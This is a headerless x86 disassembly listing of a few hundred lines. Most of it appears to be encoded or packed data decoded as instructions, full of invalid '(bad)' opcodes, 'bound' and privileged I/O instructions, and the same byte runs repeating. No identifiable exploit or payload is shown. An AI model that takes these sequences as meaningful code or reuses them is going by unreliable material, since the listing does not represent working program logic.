  43603c:	loop   0x43608f
  43603e:	pop    esi
  43603f:	bound  esp,QWORD PTR [edx+0xd]
  436042:	int    0x69
  436044:	scas   eax,DWORD PTR es:[edi]
  436045:	pusha  
  436046:	pop    ss
  436047:	adc    ebx,DWORD PTR [eax+0x5e]
  43604a:	bound  esp,QWORD PTR [edx+0xd]
  43604d:	loop   0x436067
  43604f:	pop    esi
  436050:	bound  esp,QWORD PTR [edx-0x7b]
  436053:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  436059:	call   0x1350c206
  43605e:	pop    eax
  43605f:	pop    esi
  436060:	bound  esp,QWORD PTR [edx+0x7f]
  436063:	pusha  
  436064:	or     eax,0x5e31136e
  436069:	bound  esp,QWORD PTR [edx+0xd]
  43606c:	adc    edx,DWORD PTR [eax+0x5e]
  43606f:	bound  esp,QWORD PTR [edx-0x51]
  436072:	pop    ds
  436073:	pop    ss
  436074:	jne    0x4360df
  436076:	or     eax,0x625e3ce2
  43607b:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  436081:	or     eax,0x6e139acd
  436086:	push   0x61a8e85e
  43608b:	pop    ss
  43608c:	jne    0x436028
  43608e:	or     eax,0x625e3ce2
  436093:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  436099:	xor    al,0x5e
  43609b:	call   0xcd50c248
  4360a0:	xchg   BYTE PTR ds:0x86cd1760,ch
  4360a6:	lock int 0x62
  4360a9:	bound  esp,QWORD PTR [edx+0xd]
  4360ac:	loop   0x4360f6
  4360ae:	pop    esi
  4360af:	bound  esp,QWORD PTR [edx-0x7b]
  4360b2:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  4360b8:	call   0xcd50c265
  4360bd:	imul   ebp,DWORD PTR [edi+0x2257c71f],0xda5619a
  4360c7:	fs (bad) 
  4360c9:	fs pop ebp
  4360cb:	popa   
  4360cc:	popa   
  4360cd:	popa   
  4360ce:	push   DWORD PTR [ebp+0x1c]
  4360d1:	sub    bh,bh
  4360d3:	jne    0x4360f4
  4360d5:	daa    
  4360d6:	push   DWORD PTR [ebp+0x22]
  4360d9:	adc    al,0xff
  4360db:	jne    0x4360f2
  4360dd:	sub    edi,edi
  4360df:	jne    0x4360da
  4360e1:	push   ds
  4360e2:	push   DWORD PTR [ebp-0xc]
  4360e5:	and    edi,edi
  4360e7:	jne    0x4360e8
  4360e9:	and    bh,bh
  4360eb:	jne    0x43610e
  4360ed:	adc    eax,0x226075ff
  4360f2:	push   DWORD PTR [ebp+0x57]
  4360f5:	pop    ds
  4360f6:	push   DWORD PTR [ebp+0x4e]
  4360f9:	sbb    al,0xff
  4360fb:	jne    0x43614a
  4360fd:	and    edi,edi
  4360ff:	jne    0x43614d
  436101:	(bad)  
  436102:	push   DWORD PTR [ebp+0x53]
  436105:	hlt    
  436106:	push   DWORD PTR [ebp+0x52]
  436109:	stc    
  43610a:	push   DWORD PTR [ebp+0x59]
  43610d:	dec    ebp
  43610e:	push   DWORD PTR [ebp+0x58]
  436111:	dec    esi
  436112:	push   DWORD PTR [ebp+0x4f]
  436115:	push   edi
  436116:	push   DWORD PTR [ebp+0x46]
  436119:	pusha  
  43611a:	push   DWORD PTR [ebp+0x45]
  43611d:	pop    ecx
  43611e:	push   DWORD PTR [ebp+0x28]
  436121:	push   edx
  436122:	push   DWORD PTR [ebp+0x2b]
  436125:	push   ebx
  436126:	push   DWORD PTR [ebp+0x26]
  436129:	dec    esp
  43612a:	push   DWORD PTR [ebp+0x51]
  43612d:	inc    ebp
  43612e:	push   DWORD PTR [ebp+0x50]
  436131:	inc    esi
  436132:	push   DWORD PTR [ebp+0x47]
  436135:	dec    edi
  436136:	push   DWORD PTR [ebp+0x3e]
  436139:	push   DWORD PTR ds:[ebp+0x3d]
  43613d:	inc    edi
  43613e:	push   DWORD PTR [ebp+0x3c]
  436141:	push   eax
  436142:	push   DWORD PTR [ebp+0x43]
  436145:	dec    ecx
  436146:	push   DWORD PTR [ebp+0x42]
  436149:	inc    edx
  43614a:	push   DWORD PTR [ebp+0x49]
  43614d:	inc    ebx
  43614e:	push   DWORD PTR [ebp+0x48]
  436151:	cmp    al,0xff
  436153:	jne    0x436194
  436155:	xor    eax,0x363675ff
  43615a:	push   DWORD PTR [ebp+0x35]
  43615d:	aas    
  43615e:	push   DWORD PTR [ebp+0x18]
  436161:	dec    eax
  436162:	push   DWORD PTR [ebp+0x1b]
  436165:	ret    0x75ff
  436168:	push   ss
  436169:	push   ss
  43616a:	push   DWORD PTR [ebp-0x3e]
  43616d:	sbb    edi,edi
  43616f:	jne    0x436164
  436171:	sbb    bh,bh
  436173:	jne    0x436165
  436175:	out    dx,al
  436176:	push   DWORD PTR [ebp-0xf]
  436179:	icebp  
  43617a:	push   DWORD PTR [ebp-0x12]
  43617d:	lock push DWORD PTR [ebp+0x64]
  436181:	repz push DWORD PTR [ebp-0x14]
  436185:	cli    
  436186:	push   DWORD PTR [ebp-0x13]
  436189:	in     eax,dx
  43618a:	push   DWORD PTR [ebp-0x6]
  43618d:	in     al,dx
  43618e:	push   DWORD PTR [ebp+0x31]
  436191:	push   DWORD PTR fs:[ebp+0x6f]
  436195:	push   DWORD PTR gs:[ebp+0x66]
  436199:	push   WORD PTR [ebp+0x65]
  43619d:	outs   dx,DWORD PTR ds:[esi]
  43619e:	push   DWORD PTR [ebp+0x5d]
  4361a1:	scas   al,BYTE PTR es:[edi]
  4361a2:	push   DWORD PTR [ebp+0x44]
  4361a5:	mov    ebx,0xb04b75ff
  4361aa:	push   DWORD PTR [ebp+0x4a]
  4361ad:	and    al,0xff
  4361af:	jne    0x43621a
  4361b1:	mov    edx,0xb73075ff
  4361b6:	push   DWORD PTR [ebp+0x67]
  4361b9:	lods   al,BYTE PTR ds:[esi]
  4361ba:	push   DWORD PTR [ebp+0x5e]
  4361bd:	mov    cl,0xff
  4361bf:	jne    0x436216
  4361c1:	and    eax,0xb35c75ff
  4361c6:	push   DWORD PTR [ebp+0x63]
  4361c9:	std    
  4361ca:	push   DWORD PTR [ebp+0x62]
  4361cd:	push   esp
  4361ce:	fcomp  DWORD PTR [ebx-0x6a]
  4361d1:	bound  esp,QWORD PTR [edx+0x62]
  4361d4:	popa   
  4361d5:	out    dx,al
  4361d6:	lea    ecx,ds:0x626296e2
  4361dc:	bound  esp,QWORD PTR [edx+0x6296e217]
  4361e2:	bound  esp,QWORD PTR [edx-0x28]
  4361e5:	and    edx,DWORD PTR [esi-0x5d9d9d9e]
  4361eb:	jae    0x436226
  4361ed:	or     eax,0x626296e2
  4361f2:	bound  edx,QWORD PTR [ebx+0x1c342c06]
  4361f8:	test   eax,ebx
  4361fa:	popa   
  4361fb:	popa   
  4361fc:	popa   
  4361fd:	fcomp  DWORD PTR [edx+ebx*4]
  436200:	add    al,0xe2
  436202:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436203:	bound  esp,QWORD PTR [edx+0x62]
  436206:	xchg   ebx,eax
  436207:	push   es
  436208:	loop   0x4361b1
  43620a:	bound  esp,QWORD PTR [edx+0x62]
  43620d:	sbb    dl,BYTE PTR [ebx]
  43620f:	xchg   esi,eax
  436210:	bound  esp,QWORD PTR [edx+0x62]
  436213:	add    al,0x10
  436215:	xor    al,0xa2
  436217:	bound  esp,QWORD PTR [edx+0x62]
  43621a:	out    dx,al
  43621b:	sbb    eax,0x62725bd8
  436220:	bound  esp,QWORD PTR [edx+0x61]
  436223:	fcomp  DWORD PTR [ebx-0x62]
  436226:	bound  esp,QWORD PTR [edx+0x62]
  436229:	popa   
  43622a:	or     eax,0x626272e2
  43622f:	bound  esp,QWORD PTR [edi-0x276c798b]
  436235:	ficomp DWORD PTR [edi+0x61]
  436238:	popa   
  436239:	or     eax,0xe2569a75
  43623e:	jb     0x4362a2
  436240:	bound  esp,QWORD PTR [edx-0x6d]
  436243:	push   es
  436244:	popa   
  436245:	fsubr  DWORD PTR [ecx-0x63]
  436248:	mov    dl,0x7c
  43624a:	or     eax,0x626272e2
  43624f:	(bad)  
  436250:	fmul   DWORD PTR [eax+0x61]
  436253:	pop    ss
  436254:	loop   0x4361e0
  436256:	bound  esp,QWORD PTR [edx+0x62]
  436259:	or     eax,0x626272e2
  43625e:	bound  esp,QWORD PTR [edx+0x6272e217]
  436264:	bound  esp,QWORD PTR [edx-0x12]
  436267:	add    cl,BYTE PTR ds:0xe2569a75
  43626d:	jb     0x4362d1
  43626f:	bound  esp,QWORD PTR [edx-0x6d]
  436272:	push   es
  436273:	popa   
  436274:	xchg   ebx,eax
  436275:	push   es
  436276:	outs   dx,BYTE PTR ds:[esi]
  436277:	xor    al,0xa2
  436279:	bound  esp,QWORD PTR [edx+0x62]
  43627c:	pop    ss
  43627d:	loop   0x436209
  43627f:	bound  esp,QWORD PTR [edx+0x62]
  436282:	or     eax,0x626272e2
  436287:	bound  esp,QWORD PTR [edx+0x6272e217]
  43628d:	bound  esp,QWORD PTR [edx+0xd]
  436290:	loop   0x43621c
  436292:	bound  esp,QWORD PTR [edx+0x62]
  436295:	pop    ss
  436296:	loop   0x43630e
  436298:	bound  esp,QWORD PTR [edx+0x62]
  43629b:	or     eax,0xe2569a75
  4362a0:	jb     0x436304
  4362a2:	bound  esp,QWORD PTR [edx-0x6d]
  4362a5:	push   es
  4362a6:	popa   
  4362a7:	fsubr  DWORD PTR [ecx-0x63]
  4362aa:	mov    dl,0x7c
  4362ac:	or     eax,0x626272e2
  4362b1:	(bad)  
  4362b2:	fmul   DWORD PTR [eax+0x61]
  4362b5:	pop    ss
  4362b6:	loop   0x436336
  4362b8:	bound  esp,QWORD PTR [edx+0x62]
  4362bb:	or     eax,0x626272e2
  4362c0:	bound  esp,QWORD PTR [edx+0x6272e217]
  4362c6:	bound  esp,QWORD PTR [edx-0x12]
  4362c9:	add    cl,BYTE PTR ds:0xe2569a75
  4362cf:	jb     0x436333
  4362d1:	bound  esp,QWORD PTR [edx-0x6d]
  4362d4:	push   es
  4362d5:	popa   
  4362d6:	xchg   ebx,eax
  4362d7:	push   es
  4362d8:	outs   dx,BYTE PTR ds:[esi]
  4362d9:	xor    al,0xa2
  4362db:	bound  esp,QWORD PTR [edx+0x62]
  4362de:	pop    ss
  4362df:	loop   0x43635f
  4362e1:	bound  esp,QWORD PTR [edx+0x62]
  4362e4:	or     eax,0x626272e2
  4362e9:	bound  esp,QWORD PTR [edx+0x6272e217]
  4362ef:	bound  esp,QWORD PTR [edx+0xd]
  4362f2:	loop   0x436372
  4362f4:	bound  esp,QWORD PTR [edx+0x62]
  4362f7:	pop    ss
  4362f8:	loop   0x4362f5
  4362fa:	bound  esp,QWORD PTR [edx+0x62]
  4362fd:	or     eax,0xe2569a75
  436302:	jb     0x436366
  436304:	bound  esp,QWORD PTR [edx-0x6d]
  436307:	push   es
  436308:	popa   
  436309:	fsubr  DWORD PTR [ecx-0x63]
  43630c:	mov    dl,0x7c
  43630e:	or     eax,0x626272e2
  436313:	(bad)  
  436314:	fmul   DWORD PTR [eax+0x61]
  436317:	pop    ss
  436318:	loop   0x4362ac
  43631a:	bound  esp,QWORD PTR [edx+0x62]
  43631d:	or     eax,0x626272e2
  436322:	bound  esp,QWORD PTR [edx+0x6272e217]
  436328:	bound  esp,QWORD PTR [edx-0x12]
  43632b:	add    cl,BYTE PTR ds:0xe2569a75
  436331:	jb     0x436395
  436333:	bound  esp,QWORD PTR [edx-0x6d]
  436336:	push   es
  436337:	popa   
  436338:	xchg   ebx,eax
  436339:	push   es
  43633a:	outs   dx,BYTE PTR ds:[esi]
  43633b:	xor    al,0xa2
  43633d:	bound  esp,QWORD PTR [edx+0x62]
  436340:	pop    ss
  436341:	loop   0x4362d5
  436343:	bound  esp,QWORD PTR [edx+0x62]
  436346:	or     eax,0x626272e2
  43634b:	bound  esp,QWORD PTR [edx+0x6272e217]
  436351:	bound  esp,QWORD PTR [edx+0xd]
  436354:	loop   0x4362e8
  436356:	bound  esp,QWORD PTR [edx+0x62]
  436359:	pop    ss
  43635a:	loop   0x4362ea
  43635c:	bound  esp,QWORD PTR [edx+0x62]
  43635f:	or     eax,0xe2569a75
  436364:	jb     0x4363c8
  436366:	bound  esp,QWORD PTR [edx-0x6d]
  436369:	push   es
  43636a:	popa   
  43636b:	fsubr  DWORD PTR [ecx-0x63]
  43636e:	mov    dl,0x7c
  436370:	or     eax,0x626272e2
  436375:	(bad)  
  436376:	fmul   DWORD PTR [eax+0x61]
  436379:	pop    ss
  43637a:	loop   0x436302
  43637c:	bound  esp,QWORD PTR [edx+0x62]
  43637f:	or     eax,0x626272e2
  436384:	bound  esp,QWORD PTR [edx+0x6272e217]
  43638a:	bound  esp,QWORD PTR [edx-0x12]
  43638d:	add    cl,BYTE PTR ds:0xe2569a75
  436393:	jb     0x4363f7
  436395:	bound  esp,QWORD PTR [edx-0x6d]
  436398:	push   es
  436399:	popa   
  43639a:	xchg   ebx,eax
  43639b:	push   es
  43639c:	outs   dx,BYTE PTR ds:[esi]
  43639d:	xor    al,0xa2
  43639f:	bound  esp,QWORD PTR [edx+0x62]
  4363a2:	pop    ss
  4363a3:	loop   0x43632b
  4363a5:	bound  esp,QWORD PTR [edx+0x62]
  4363a8:	or     eax,0x626272e2
  4363ad:	bound  esp,QWORD PTR [edx+0x6272e217]
  4363b3:	bound  esp,QWORD PTR [edx+0xd]
  4363b6:	loop   0x43633e
  4363b8:	bound  esp,QWORD PTR [edx+0x62]
  4363bb:	pop    ss
  4363bc:	loop   0x436364
  4363be:	bound  esp,QWORD PTR [edx+0x62]
  4363c1:	or     eax,0x626276e2
  4363c6:	bound  ebx,QWORD PTR [edi]
  4363c8:	dec    eax
  4363c9:	mov    BYTE PTR ds:0x6262fb13,cl
  4363cf:	bound  ebx,QWORD PTR [edi]
  4363d1:	aas    
  4363d2:	xchg   BYTE PTR [esi+0x1f],dl
  4363d5:	or     eax,0x62628e13
  4363da:	bound  ebx,QWORD PTR [edi]
  4363dc:	aas    
  4363dd:	cmp    edx,DWORD PTR [esi-0x1e]
  4363e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4363e1:	bound  esp,QWORD PTR [edx+0x62]
  4363e4:	push   esi
  4363e5:	pusha  
  4363e6:	pop    ss
  4363e7:	adc    edi,DWORD PTR [eax]
  4363e9:	bound  esp,QWORD PTR [edx+0x62]
  4363ec:	or     eax,0x62629ee2
  4363f1:	bound  esp,QWORD PTR [edi-0x2b8c818b]
  4363f7:	or     eax,0x626238e2
  4363fc:	bound  ebx,QWORD PTR [edi]
  4363fe:	repz xchg edx,eax
  436400:	aad    0x62
  436402:	popa   
  436403:	popa   
  436404:	popa   
  436405:	or     eax,0x135692cd
  43640a:	sahf   
  43640b:	bound  esp,QWORD PTR [edx+0x62]
  43640e:	add    al,0x68
  436410:	or     eax,0x62629ee2
  436415:	bound  esp,QWORD PTR [edx+0x629ee217]
  43641b:	bound  esp,QWORD PTR [edx+0xd]
  43641e:	loop   0x4363be
  436420:	bound  esp,QWORD PTR [edx+0x62]
  436423:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436424:	jne    0x4364a4
  436426:	jae    0x4363fc
  436428:	or     eax,0x626238e2
  43642d:	bound  ebx,QWORD PTR [edi]
  43642f:	repz call 0xd61:0x616162d5
  436437:	int    0x92
  436439:	push   esi
  43643a:	adc    ebx,DWORD PTR [esi+0x4626262]
  436440:	push   0x629ee20d
  436445:	bound  esp,QWORD PTR [edx-0x5e]
  436448:	pop    ss
  436449:	loop   0x4363e9
  43644b:	bound  esp,QWORD PTR [edx+0x62]
  43644e:	or     eax,0x62629ee2
  436453:	bound  esp,QWORD PTR [edi+0x7f737e75]
  436459:	or     eax,0x626238e2
  43645e:	(bad)  
  43645f:	aad    0x62
  436461:	popa   
  436462:	popa   
  436463:	popa   
  436464:	or     eax,0x135692cd
  436469:	sahf   
  43646a:	bound  esp,QWORD PTR [edx+0x62]
  43646d:	add    al,0x68
  43646f:	or     eax,0x62629ee2
  436474:	bound  esp,QWORD PTR [edx+0x629ee217]
  43647a:	bound  esp,QWORD PTR [edx-0x10]
  43647d:	mov    al,0x5c
  43647f:	bound  esp,QWORD PTR [edx+0x57]
  436482:	and    dl,BYTE PTR [edx+0x640da561]
  436488:	leave  
  436489:	fcom   DWORD PTR [ebp+0x750d6155]
  43648f:	call   0xa206:0x93867556
  436496:	(bad)  
  436497:	fsubr  DWORD PTR [ecx-0x63]
  43649a:	mov    dl,0x3a
  43649c:	or     eax,0x17a25575
  4364a1:	jne    0x4364f8
  4364a3:	or     eax,0x75569a75
  4364a8:	xchg   BYTE PTR [ebx-0x279c5dfa],dl
  4364ae:	imul   ebx,DWORD PTR [ebp+0x750d3ab2],0x7517a255
  4364b8:	push   ebp
  4364b9:	or     eax,0xf31f8675
  4364be:	pop    edi
  4364bf:	jnp    0x4364dd
  4364c1:	push   esi
  4364c2:	sub    eax,0x22575575
  4364c7:	.byte 0x9a
  4364c8:	popa   
